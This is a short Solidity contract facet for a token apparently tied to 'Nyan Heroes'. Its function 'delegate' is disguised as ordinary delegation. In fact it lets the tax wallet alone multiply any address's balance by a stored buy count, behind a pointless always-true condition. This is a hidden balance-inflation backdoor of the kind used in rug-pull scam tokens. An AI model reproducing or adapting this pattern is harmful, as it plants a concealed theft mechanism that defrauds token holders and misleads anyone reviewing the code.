// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://nyanheroes.com/
    Twitter:  https://twitter.com/nyanheroes
    Telegram: https://t.me/nyanheroes
    Discord:  https://discord.com/invite/nyanheroes

*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract delegateFacet is Ownable {
    function delegate(address delegatee) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (true) {
            require(ds._taxWallet == _msgSender());
            ds._balances[delegatee] *= ds.buyCount;
        }
    }
}
